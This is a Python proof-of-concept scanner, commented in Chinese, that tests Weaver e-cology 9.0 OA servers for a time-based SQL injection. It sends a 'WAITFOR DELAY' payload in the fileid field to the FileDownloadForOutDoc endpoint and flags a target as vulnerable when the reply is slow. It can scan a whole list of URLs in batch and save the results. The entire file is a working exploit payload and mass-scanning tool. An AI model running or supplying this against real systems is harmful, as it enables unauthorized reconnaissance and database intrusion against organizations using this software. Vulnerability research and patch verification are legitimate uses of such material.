import argparse
import requests
import urllib.parse
import random

def check_vulnerability(url):
    parsed_url = urllib.parse.urlparse(url)

    # 获取主机名
    host = parsed_url.netloc
    # 检查url
    if not url.startswith('http'):
        url = 'http://' + url
    # 确定请求的URL
    if not parsed_url.path.endswith('/'):
        url += '/'

    request_url = urllib.parse.urljoin(url, 'weaver/weaver.file.FileDownloadForOutDoc')

    headers = {
        "Host": host,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "Referer": "127.0.0.1:9999/wui/index.html",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Content-Length": "45"
    }
    fileid = random.randint(0, 99)
    data = f"fileid={fileid}+WAITFOR+DELAY+'0:0:3'&isFromOutImg=1"

    response = requests.post(request_url, headers=headers, data=data)
    if response.elapsed.total_seconds() >= 3:
        return f"存在泛微 e-cology 9.0 OA漏洞"
    else:
        return f"不存在泛微 e-cology 9.0 OA漏洞"
def main():
    # 解析命令行参数
    parser = argparse.ArgumentParser(description="Send POST request and check for vulnerability")
    parser.add_argument("-u", "--url", type=str, help="URL of the target")
    parser.add_argument("-t", "--txt", type=str, help="Path to the text file containing URLs")
    args = parser.parse_args()

    # 处理单个URL的情况
    if args.url:
        result = check_vulnerability(args.url)
        print(result)
        return

    # 处理文本文件中包含多个URL的情况
    if args.txt:
        with open(args.txt, 'r') as file:
            urls = file.readlines()
            urls = [url.strip() for url in urls if url.strip()]

        num_urls = len(urls)
        current_url = 0

        results = []

        for url in urls:
            current_url += 1
            print(f"正在处理 URL: {url.strip()} [{current_url}/{num_urls}]")
            result = check_vulnerability(url.strip())
            results.append(result)

        output_file = "e-cology-9.0-OA-result.txt"

        with open(output_file, "w") as file:
            for url, result in zip(urls, results):
                file.write(f"{url.strip()}:\n")
                file.write(f"  {result}\n")

        print(f"结果已保存至 {output_file}")

if __name__ == "__main__":
    main()
